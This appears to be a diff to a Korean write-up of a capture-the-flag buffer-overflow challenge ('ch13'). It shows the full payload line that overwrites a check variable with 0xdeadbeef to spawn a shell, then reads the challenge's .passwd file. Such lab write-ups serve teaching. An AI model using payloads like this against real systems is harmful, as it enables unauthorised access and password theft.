@@ -71,7 +71,7 @@ check변수를 원하는 값(0xdeadbeef)으로 덮을 수 있다.
 `(python -c 'print "A"*40 + "\xef\xbe\xad\xde"' ; cat) | ./ch13` 가 최종 페이로드코드가 된다.
 
 * 위 페이로드를 넣으면 `"Yeah dude! You win!\nOpening your shell...\n"` 라는 문구가 나오고
-* `ls -a` 명령어를 통해 .passwd파일을 확인할 수 있고 `cat` 명령어를 통해 password를 취할 수 있다.
+* 이후 `ls -a` 명령어를 통해 .passwd파일을 확인할 수 있고 `cat` 명령어를 통해 password를 취할 수 있다.
 
 
 
